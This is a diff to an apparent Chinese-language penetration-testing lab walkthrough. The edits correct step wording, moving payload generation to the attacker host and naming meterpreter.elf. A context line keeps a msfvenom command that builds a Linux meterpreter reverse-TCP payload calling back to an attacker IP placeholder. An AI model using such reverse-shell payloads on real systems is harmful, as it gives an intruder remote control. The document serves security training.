@@ -10,7 +10,7 @@
 
 ### 步骤一 设立立足点并发现靶标2-3
 
-1. 在靶机上生成meterpreter.elf文件
+1. 在攻击者主机上生成meterpreter.elf文件
 ` msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<攻击者主机IP> LPORT=<端口> -f elf > meterpreter.elf`
 ![](./pics/手动生成meterpretershell.png)
 
@@ -27,7 +27,7 @@ run -j
 ```
 注意，这里的IP和端口要和生成.elf文件时设置的一样
 
-5. 在靶机里运行meterpreter
+5. 在靶机里运行meterpreter.elf
 ![](./pics/进入容器下载文件并运行.png)
 
 6. 返回到攻击者主机，可以看到连接成功
@@ -63,7 +63,6 @@ run -j
 ![](./pics/访问thinkphp.png)
 
 ### 步骤二 攻击新发现的靶机
-
 
 #### nginx
 nginx
